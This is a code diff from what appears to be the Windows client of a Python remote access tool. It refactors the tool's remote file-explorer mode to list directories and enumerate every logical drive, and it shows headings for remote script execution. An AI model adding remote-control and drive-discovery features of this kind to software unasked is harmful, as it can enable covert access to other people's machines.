@@ -154,31 +154,16 @@ while 1:
                     elif self.data['mode'] == 'updateSource':
                         raise ValueError('Manually Generated Exception')
 
-                    # Explorer Commands
+                    # Shell Mode
                     elif self.data['mode'] == 'explorerMode' and self.data['payload'].startswith('cd '):
                         try:
                             os.chdir(self.data['payload'][3:])
-                            output = ''
+                            output = get_content()
                         except:
-                            output = 'dirOpenError'
-
+                            output = get_content()
                     # List Directory
                     elif self.data['mode'] == 'explorerMode' and self.data['payload'] == 'getContent':
-                        string = {
-                            'path': os.getcwdu()
-                        }
-                        try:
-                            for n, i in enumerate(os.listdir(u'.')):
-                                string[n] = {
-                                    'name': i,
-                                    'type': os.path.isfile(i),
-                                    'size': os.path.getsize(i),
-                                    'modified': time.ctime(os.path.getmtime(i)),
-                                    'hidden': has_hidden_attribute(i)
-                                }
-                            output = str(string)
-                        except WindowsError:
-                            output = 'windowsError'
+                        output = get_content()
 
                     # Execute Script
                     elif self.data['mode'] == 'scriptingMode':
@@ -315,6 +300,44 @@ while 1:
                     open(os.path.join(os.path.dirname(sys.argv[0]), 'info.nfo'), 'w').write(str(variables))
                     os.popen('attrib -h -r -s /s /d %s' % os.path.join(os.path.dirname(sys.argv[0]), 'info.nfo'))
                     return variables
+
+
+            def get_content():
+                string = {
+                    'path': os.getcwdu(),
+                    'logicalDrives': {},
+                }
+                uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+                bitmask = Kernel32.GetLogicalDrives()
+                for letter in uppercase:
+                    drive = u'{}:\\'.format(letter)
+                    if bitmask & 1:
+                        try:
+                            os.chdir(drive)
+                        except:
+                            continue
+                        volume_name_buffer = ctypes.create_unicode_buffer(1024)
+                        Kernel32.GetVolumeInformationW(drive, volume_name_buffer,
+                                                       ctypes.sizeof(volume_name_buffer), None, None, None, None,
+                                                       None)
+                        string['logicalDrives'][drive] = {
+                            'name': volume_name_buffer.value,
+                            'type': Kernel32.GetDriveTypeW(drive),
+                        }
+                    bitmask >>= 1
+                try:
+                    os.chdir(string['path'])
+                    for n, i in enumerate(os.listdir(u'.')):
+                        string[n] = {
+                            'name': i,
+                            'type': os.path.isfile(i),
+                            'size': os.path.getsize(i),
+                            'modified': time.ctime(os.path.getmtime(i)),
+                            'hidden': has_hidden_attribute(i)
+                        }
+                    return str(string)
+                except WindowsError:
+                    return 'windowsError'
 
 
             def set_info(values):
